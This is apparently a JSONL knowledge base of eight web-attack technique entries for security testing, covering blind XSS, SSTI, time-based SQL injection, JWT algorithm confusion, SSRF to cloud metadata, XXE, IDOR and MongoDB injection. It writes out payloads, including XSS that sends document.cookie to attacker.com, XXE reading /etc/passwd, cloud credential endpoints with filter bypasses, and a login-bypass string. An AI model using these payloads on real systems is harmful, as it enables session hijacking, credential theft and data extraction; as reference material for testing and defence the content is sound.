{"id": "xss-blind-detection", "domain": "web", "category": "technique", "content": "Blind XSS requires out-of-band exfiltration for detection. Use callback servers (Burp Collaborator, interactsh) or DNS logging. Common injection points: contact forms, admin panels, log viewers, support tickets. Payloads: <script src='//attacker.com/x.js'></script>, <img src=x onerror=fetch('//attacker.com?c='+document.cookie)>. Detection latency: minutes to days.", "tags": ["xss", "oob", "blind", "web"], "source": "OWASP XSS Guide"}
{"id": "ssti-detection", "domain": "web", "category": "technique", "content": "Server-Side Template Injection (SSTI) detection via polyglot payloads. Test common engines: {{7*7}} (Jinja2/Twig), ${7*7} (FreeMarker), <%= 7*7 %> (ERB). Detection: Math expression evaluation, error messages revealing template engine. Exploitation varies by engine: Jinja2/Twig - {{config}}, FreeMarker - <#assign ex='freemarker.template.utility.Execute'?new()>.", "tags": ["ssti", "template", "rce", "web"], "source": "PortSwigger SSTI"}
{"id": "sqli-time-blind", "domain": "web", "category": "technique", "content": "Time-based blind SQL injection for data extraction without visible output. MySQL: SELECT SLEEP(5), PostgreSQL: SELECT pg_sleep(5), MSSQL: WAITFOR DELAY '00:00:05'. Binary search technique for efficient extraction. Example: AND IF(ASCII(SUBSTRING((SELECT database()),1,1))>100, SLEEP(5), 0). Detection: Response time delays correlating with payload.", "tags": ["sqli", "blind", "time-based", "web"], "source": "SQL Injection Cheatsheet"}
{"id": "jwt-algorithm-confusion", "domain": "web", "category": "technique", "content": "JWT algorithm confusion attack exploits RS256 to HS256 downgrade. Server validates HMAC signature using RSA public key as secret. Steps: 1) Obtain public key, 2) Change alg to HS256, 3) Sign with public key as secret. Detection: JWT with HS256 on RSA-configured endpoints, mismatched algorithm expectations.", "tags": ["jwt", "auth", "crypto", "web"], "source": "JWT Security Best Practices"}
{"id": "ssrf-cloud-metadata", "domain": "cloud", "category": "technique", "content": "SSRF to cloud metadata services for credential theft. AWS: http://169.254.169.254/latest/meta-data/iam/security-credentials/, Azure: http://169.254.169.254/metadata/identity/oauth2/token, GCP: http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token. Bypass filters: Use redirects, DNS rebinding, alternate encodings (decimal, hex IPs).", "tags": ["ssrf", "cloud", "aws", "azure", "gcp"], "source": "Cloud Security Research"}
{"id": "xxe-file-read", "domain": "web", "category": "technique", "content": "XXE (XML External Entity) for local file disclosure. Payload: <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>. Out-of-band XXE: <!ENTITY % dtd SYSTEM 'http://attacker.com/evil.dtd'>%dtd;. Detection: XML parsing errors, file content in responses, OOB callbacks. Common targets: SOAP APIs, XML upload features, RSS parsers.", "tags": ["xxe", "xml", "file-read", "web"], "source": "OWASP XXE"}
{"id": "idor-detection", "domain": "web", "category": "technique", "content": "IDOR (Insecure Direct Object Reference) exploitation via parameter manipulation. Common patterns: /api/user/{id}, /document/{uuid}, ?file=report.pdf. Testing: Sequential IDs, UUID bruteforce, session token swapping. Detection: Access to unauthorized resources, missing authorization checks. Automate with Burp Intruder, ffuf, or custom scripts.", "tags": ["idor", "authz", "access-control", "web"], "source": "OWASP Top 10"}
{"id": "nosql-injection-mongodb", "domain": "web", "category": "technique", "content": "NoSQL injection in MongoDB via operator injection. Login bypass: username[$ne]=null&password[$ne]=null. Data extraction: username[$regex]=^a.*&password[$ne]=null (character-by-character). JSON payload: {\"username\": {\"$ne\": null}}. Detection: Unexpected query behavior, authentication bypass, MongoDB error messages.", "tags": ["nosqli", "mongodb", "injection", "web"], "source": "NoSQL Injection Guide"}
